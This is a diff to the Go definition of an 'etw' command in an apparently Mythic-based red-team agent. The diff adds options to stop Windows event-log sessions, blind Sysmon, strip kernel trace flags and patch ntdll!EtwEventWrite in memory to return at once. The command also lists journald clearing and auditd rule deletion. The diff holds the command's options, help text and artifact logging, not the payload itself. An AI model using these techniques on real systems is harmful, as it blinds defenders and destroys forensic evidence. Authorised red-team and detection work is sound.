@@ -16,8 +16,8 @@ func init() {
 			Author:     "@galoryber",
 		},
 		Description:         "Audit/telemetry subsystem manipulation. Windows: ETW trace sessions and providers. Linux: auditd rules, journald, syslog, SIEM agent detection. macOS: unified logging, security agent detection.",
-		HelpString:          "# Windows\netw -action sessions\netw -action stop -session_name EventLog-Security\n# Linux\netw -action rules\netw -action agents\netw -action journal-clear -provider 1s\netw -action syslog-config\n# macOS\netw -action categories\netw -action agents",
-		Version:             5,
+		HelpString:          "# Windows\netw -action sessions\netw -action provider-list\netw -action stop -session_name EventLog-Security\netw -action blind -session_name Sysmon -provider sysmon\netw -action provider-disable -session_name \"NT Kernel Logger\" -provider process\netw -action patch -provider etw\netw -action restore\n# Linux\netw -action rules\netw -action agents\netw -action journal-clear -provider 1s\netw -action syslog-config\n# macOS\netw -action categories\netw -action agents",
+		Version:             6,
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1082", "T1562.001", "T1562.002", "T1562.006", "T1070.002"},
 		SupportedUIFeatures: []string{},
@@ -33,9 +33,9 @@ func init() {
 				Name:          "action",
 				CLIName:       "action",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"sessions", "providers", "stop", "blind", "query", "enable", "patch", "restore", "rules", "disable-rule", "journal-clear", "journal-rotate", "syslog-config", "agents", "audit-status", "categories"},
+				Choices:       []string{"sessions", "providers", "provider-list", "stop", "blind", "query", "enable", "provider-disable", "provider-enable", "patch", "restore", "rules", "disable-rule", "journal-clear", "journal-rotate", "syslog-config", "agents", "audit-status", "categories"},
 				DefaultValue:  "sessions",
-				Description:   "Windows: sessions/providers/stop/blind/query/enable/patch/restore. Linux: rules/disable-rule/journal-clear/journal-rotate/syslog-config/agents/audit-status. macOS: categories/agents/audit-status.",
+				Description:   "Windows: sessions/providers/provider-list/stop/blind/query/enable/provider-disable/provider-enable/patch/restore. Linux: rules/disable-rule/journal-clear/journal-rotate/syslog-config/agents/audit-status. macOS: categories/agents/audit-status.",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -105,6 +105,10 @@ func init() {
 				msg += "Clearing journal logs destroys forensic evidence (T1070.002). Journald vacuum operations are logged by systemd."
 			case "journal-rotate":
 				msg += "Rotating journal files is lower risk but may trigger log management alerts."
+			case "provider-disable":
+				msg += "Modifying kernel trace EnableFlags via ControlTrace UPDATE. Removes specific kernel event categories from trace sessions. EDR vendors detect kernel trace tampering (T1562.006)."
+			case "provider-enable":
+				msg += "Re-enabling kernel trace flags. ControlTrace UPDATE call is lower risk but may be logged."
 			case "patch":
 				msg += "In-memory patching of EtwEventWrite via VirtualProtect + byte write. Stealthier than API-based blind but triggers VirtualProtect on ntdll — a high-fidelity EDR detection (T1562.001)."
 			case "restore":
@@ -164,6 +168,35 @@ func init() {
 					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
 						fmt.Sprintf("ETW Provider Enabled: %s (session: %s)", provider, sessionName))
 				}
+			case "patch":
+				provider, _ := processResponse.TaskData.Args.GetStringArg("provider")
+				if strings.Contains(responseText, "Patched") || strings.Contains(responseText, "patched") {
+					target := provider
+					if target == "" {
+						target = "EtwEventWrite"
+					}
+					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
+						fmt.Sprintf("ETW In-Memory Patch: %s (ret 0xC3)", target))
+				}
+			case "restore":
+				if strings.Contains(responseText, "Restored") || strings.Contains(responseText, "restored") {
+					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
+						"ETW Patch Restored: original function bytes reinstated")
+				}
+			case "provider-disable":
+				provider, _ := processResponse.TaskData.Args.GetStringArg("provider")
+				sessionName, _ := processResponse.TaskData.Args.GetStringArg("session_name")
+				if strings.Contains(responseText, "disabled") || strings.Contains(responseText, "Successfully") {
+					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
+						fmt.Sprintf("Kernel Trace Flag Disabled: %s (session: %s)", provider, sessionName))
+				}
+			case "provider-enable":
+				provider, _ := processResponse.TaskData.Args.GetStringArg("provider")
+				sessionName, _ := processResponse.TaskData.Args.GetStringArg("session_name")
+				if strings.Contains(responseText, "enabled") || strings.Contains(responseText, "Successfully") {
+					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
+						fmt.Sprintf("Kernel Trace Flag Enabled: %s (session: %s)", provider, sessionName))
+				}
 			}
 			return response
 		},
@@ -194,6 +227,22 @@ func init() {
 					fmt.Sprintf("[DEFENSE EVASION] etw blind: disabling provider %s in session %s on %s", provider, sessionName, taskData.Callback.Host), true)
 			case "enable":
 				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("ETW EnableTraceEx2(EVENT_CONTROL_CODE_ENABLE_PROVIDER) session=%s provider=%s", sessionName, provider))
+			case "provider-disable":
+				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("ETW ControlTrace(EVENT_TRACE_CONTROL_UPDATE) session=%s disable_flag=%s", sessionName, provider))
+				logOperationEvent(taskData.Task.ID,
+					fmt.Sprintf("[DEFENSE EVASION] etw provider-disable: removing kernel trace flag %s from session %s on %s", provider, sessionName, taskData.Callback.Host), true)
+			case "provider-enable":
+				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("ETW ControlTrace(EVENT_TRACE_CONTROL_UPDATE) session=%s enable_flag=%s", sessionName, provider))
+			case "patch":
+				target := provider
+				if target == "" {
+					target = "EtwEventWrite"
+				}
+				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("VirtualProtect+ByteWrite ntdll!%s → 0xC3 (ret)", target))
+				logOperationEvent(taskData.Task.ID,
+					fmt.Sprintf("[DEFENSE EVASION] etw patch: in-memory patching %s on %s", target, taskData.Callback.Host), true)
+			case "restore":
+				createArtifact(taskData.Task.ID, "API Call", "VirtualProtect+ByteWrite restore original ETW function bytes")
 			case "disable-rule":
 				createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("auditctl -d %s", sessionName))
 				logOperationEvent(taskData.Task.ID,
